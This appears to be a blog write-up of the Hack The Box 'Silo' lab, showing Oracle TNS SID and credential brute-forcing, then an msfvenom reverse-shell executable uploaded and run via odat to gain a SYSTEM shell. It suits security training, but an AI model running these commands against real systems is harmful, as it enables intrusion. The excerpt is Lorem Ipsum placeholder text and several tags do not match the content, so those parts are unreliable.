---
layout: single
title: Silo - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-03-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-silo/silo_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-silo/silo_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/silo]# nmap -Pn -n -sCV 10.10.10.82 --open                                                                         (master✱)
    PORT      STATE SERVICE      VERSION
    80/tcp    open  http         Microsoft IIS httpd 8.5
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/8.5
    |_http-title: IIS Windows Server
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49159/tcp open  msrpc        Microsoft Windows RPC
    49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
    49161/tcp open  msrpc        Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 3m40s, deviation: 0s, median: 3m39s
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: supported
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2021-03-03T14:54:11
    |_  start_date: 2021-03-03T14:50:28


  RPCCLIENT:
    -U "": Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

  SMBCLIENT:
    anonymous: session setup failed: NT_STATUS_LOGON_FAILURE

  DIRB:
  ==> DIRECTORY: http://10.10.10.82/aspnet_client/
  ==> DIRECTORY: http://10.10.10.82/aspnet_client/system_web/

  NIKTO:
  + Server: Microsoft-IIS/8.5
  + Retrieved x-aspnet-version header: 4.0.30319
  + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST


2. Looking through the nmap output we see port 1521, 'Oracle TNS listener 11.2.0.2.0 (unauthorized)'. This sounds like a good start.
Searching for Oracle TNS exploits we come across a post from HackTricks, teaching us the steps to take when testing the service.

  a) Enumerate version info (search for known vulns)
  b) Bruteforce TNS listener communication (not always needed)
  c) Enumerate/Bruteforce SID names (like database names)
  d) Bruteforce credentials for valid SID name discovered
  e) Try to execute code

  As we already know the version (11.2.0.2.0) we can jump straight to step c, Bruteforce SID names.
    [root:/git/htb/silo]# hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid              (master✱)
      Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

      Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-03 16:03:34
      [DATA] max 16 tasks per 1 server, overall 16 tasks, 576 login tries (l:576/p:1), ~36 tries per task
      [DATA] attacking oracle-sid://10.10.10.82:1521/
      [1521][oracle-sid] host: 10.10.10.82   login: XE
      [1521][oracle-sid] host: 10.10.10.82   login: PLSExtProc
      [1521][oracle-sid] host: 10.10.10.82   login: CLRExtProc
      [1521][oracle-sid] host: 10.10.10.82
      1 of 1 target successfully completed, 4 valid passwords found

    We find four SIDs: XE, PLSExtProc, CLRExtProc, <blank>


3. Next we need to bruteforce credentials (step d). We can use either msf or nmap for this, so obviously we go for nmap.
    [root:/git/htb/silo]# nmap --script=oracle-brute --script-args=oracle-brute.sid=XE 10.10.10.82 -p 1521                            (master✱)
      PORT     STATE SERVICE
      1521/tcp open  oracle
      | oracle-brute:
      |   Accounts:
      |     CTXSYS:CTXSYS - Account is locked
      |     MDSYS:MDSYS - Account is locked
      |     OUTLN:OUTLN - Account is locked
      |     HR:HR - Account is locked
      |     DBSNMP:DBSNMP - Account is locked
      |     DIP:DIP - Account is locked
      |     XDB:CHANGE_ON_INSTALL - Account is locked
      |_  Statistics: Performed 695 guesses in 15 seconds, average tps: 46.3

    Nothing.. lets download the user- and password-list from HackTricks and run the script again.

    [root:/git/htb/silo]# nmap --script=oracle-brute --script-args=oracle-brute.sid=XE,userdb=/git/htb/silo/users-oracle.txt,passdb=/git/htb/silo/pass-oracle.txt 10.10.10.82 -p 1521
      Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 16:58 CET
      PORT     STATE SERVICE
      1521/tcp open  oracle
      | oracle-brute:
      |   Accounts:
      |     ctxsys:ctxsys - Account is locked
      |     outln:outln - Account is locked
      |     OUTLN:outln - Account is locked
      |     MDSYS:mdsys - Account is locked
      |     xdb:xdb - Account is locked
      |     system:06071992 - Account is locked
      |     XDB:xdb - Account is locked
      |     SYSTEM:06071992 - Account is locked
      |     SCOTT:0racl3 - Account is locked
      |     mdsys:mdsys - Account is locked
      |     hr:hr - Account is locked
      |     DBSNMP:dbsnmp - Account is locked
      |     CTXSYS:ctxsys - Account is locked
      |     HR:hr - Account is locked
      |     dbsnmp:dbsnmp - Account is locked
      |     DIP:dip - Account is locked
      |     dip:dip - Account is locked
      |     scott:0RACL3 - Account is locked
      |_  Statistics: Performed 110942 guesses in 900 seconds, average tps: 99.0

    No luck there either.. continue to read on about pentesting Oracle Databases and come across the software Odat, lets try it.

    [root:/opt/odat]# python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE                                                           (master✱)
      [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
      100% |######################################################################################################################| Time: 00:11:14
      [-] No found a valid account on 10.10.10.82:1521/XE. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-files accounts/logins.txt accounts/pwds.txt'

    Testing the other wordlists with Odat doesn't give anything either.. lets try steal the one msf uses.
    Look at the formating of a random Odat wordlist, to make the msf alike.

    [root:/opt/odat]# head accounts/accounts_small.txt                                                                        (master-python3✱)
      anonymous/anonymous
      applsys/applsys
      apps/apps

    [root:/opt/odat]# head /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt                         (master-python3✱)
      brio_admin brio_admin
      brugernavn adgangskode
      brukernavn password

    So we need to change space to /, and run again with the new wordlist.
    [root:/opt/odat]# python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/msf-list.txt      (master-python3✱)
      [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
      [!] Notice: 'ctxsys' account is locked, so skipping this username for password                                              | ETA:  00:05:13
      [!] Notice: 'hr' account is locked, so skipping this username for password                                                  | ETA:  00:04:49
      [!] Notice: 'mdsys' account is locked, so skipping this username for password                                               | ETA:  00:03:45
      [!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                              | ETA:  00:03:04
      [!] Notice: 'dip' account is locked, so skipping this username for password                                                 | ETA:  00:02:57
      [!] Notice: 'system' account is locked, so skipping this username for password                                              | ETA:  00:02:06
      [!] Notice: 'xdb' account is locked, so skipping this username for password                                                 | ETA:  00:01:15
      [!] Notice: 'outln' account is locked, so skipping this username for password                                               | ETA:  00:00:59
      [!] Notice: 'scott' account is locked, so skipping this username for password                                               | ETA:  00:00:11
      100% |######################################################################################################################| Time: 00:04:52
      [-] No found a valid account on 10.10.10.82:1521/sid:XE. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-files accounts/logins.txt accounts/pwds.txt'

    Reset the box and try again, BOOM!
    [root:/opt/odat]# python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/msf-list.txt      (master-python3✱)
      [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
      --- snip ---
      [+] Accounts found on 10.10.10.82:1521/sid:XE:
        scott/tiger


4. We got credentials, scott/tiger, so lastly we exploit.
   Reading the documentation on HackTricks we can both Write files and Execude code, maybe we can get a reverse shell?

  Write files:
    ./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt

  Read files:
    ./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"

  Execute code via External Tables:
    ./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"

  Create a payload, and upload it.

  [root:/git/htb/silo]# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4488 -f exe -o silo-rev.exe
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of exe file: 7168 bytes
    Saved as: silo-rev.exe

  [root:/opt/odat]# python3 odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --putFile C:/ silo-rev.exe /git/htb/silo/silo-rev.exe
    [1] (10.10.10.82:1521): Put the /git/htb/silo/silo-rev.exe local file in the C:/ folder like silo-rev.exe on the 10.10.10.82 server
    [-] Impossible to put the /git/htb/silo/silo-rev.exe file: `ORA-01031: insufficient privileges`

  Our privileges are to low. This error can be avoided by signing on "as sysdba", luckily there is a --sysdba flag in odat.

  [root:/opt/odat]# python3 odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --sysdba --putFile C:/ silo-rev.exe /git/htb/silo/silo-rev.exe
    [1] (10.10.10.82:1521): Put the /git/htb/silo/silo-rev.exe local file in the C:/ folder like silo-rev.exe on the 10.10.10.82 server
    [+] The /git/htb/silo/silo-rev.exe file was created on the C:/ directory on the 10.10.10.82 server like the silo-rev.exe file

  [root:/opt/odat]# python3 odat.py externaltable -s 10.10.10.82 -U scott -P tiger -d XE --sysdba --exec c:/ silo-rev.exe
    [1] (10.10.10.82:1521): Execute the silo-rev.exe command stored in the c:/ path

  [root:/git/htb/silo]# rlwrap nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.8] from (UNKNOWN) [10.10.10.82] 49163
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.

    C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE> whoami
      nt authority\system

    C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE> cd C:\Users
    C:\Users> type Phineas\Desktop\user.txt
      92ede778a1cc8d27cb6623055c331617
    C:\Users> type Administrator\Desktop\root.txt
      cd39ea0af657a495e33bc59c7836faf6


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. -


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


Hacking Oracle TNS Listener:
  https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

NMAP Oracle Brute:
  https://nmap.org/nsedoc/scripts/oracle-brute.html
  https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/

Odat:
  https://github.com/quentinhardy/odat
  http://www.dba-oracle.com/t_ora_01031_insufficient_privileges.htm
